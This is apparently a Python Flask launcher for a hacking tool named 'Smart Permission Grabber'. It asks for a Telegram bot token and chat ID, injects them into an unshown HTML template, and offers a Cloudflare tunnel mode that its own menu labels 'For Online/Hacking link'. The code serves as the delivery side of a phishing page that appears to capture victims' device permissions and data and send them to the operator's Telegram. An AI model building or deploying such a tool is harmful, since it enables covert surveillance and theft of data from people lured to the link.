import os
import subprocess
import time
from flask import Flask, render_template

app = Flask(__name__)

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""
    \033[1;32m
     __  __             _     _      _    _            _             
    |  \/  |           (_)   | |    | |  | |          | |            
    | \  / |_   _ _ __  _ ___| |__  | |__| | __ _  ___| | _____ _ __ 
    | |\/| | | | | '_ \| / __| '_ \ |  __  |/ _` |/ __| |/ / _ \ '__|
    | |  | | |_| | | | | \__ \ | | || |  | | (_| | (__|   <  __/ |   
    |_|  |_|\__,_|_| |_|_|___/_| |_||_|  |_|\__,_|\___|_|\_\___|_|   
    
    \033[1;31m[+] Developer: Munish Kumar
    \033[1;34m[+] Tool: Smart Permission Grabber
    \033[1;37m------------------------------------------------------------
    """)

banner()

# 1. पहले टोकन और आईडी मांगें
token = input("\033[1;33m[?] Enter your Bot Token: \033[0m")
chatid = input("\033[1;33m[?] Enter your Chat ID: \033[0m")

# 2. अब मोड पूछें (यही हिस्सा आपके पिछले कोड में मिसिंग था)
print("\n\033[1;36m[ Select Mode ]")
print("1. Localhost (For testing only)")
print("2. Cloudflare (For Online/Hacking link)\033[0m")
choice = input("\n[#] Select Option (1 or 2): ")

@app.route('/')
def index():
    return render_template('index.html', bot_token=token, chat_id=chatid)

def start_cloudflare():
    print("\n\033[1;32m[*] Starting Cloudflare Tunnel...\033[0m")
    # बैकग्राउंड में क्लाउडफ्लेयर चलाना
    subprocess.Popen(['cloudflared', 'tunnel', '--url', 'http://127.0.0.1:8080'], 
                     stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    time.sleep(5) 
    print("\033[1;33m[!] Check the output above for the 'https://...' link.\033[0m")

if __name__ == '__main__':
    if choice == '2':
        start_cloudflare()
    
    print("\n\033[1;32m[*] Server starting on Port 8080...\033[0m")
    app.run(host='0.0.0.0', port=8080)
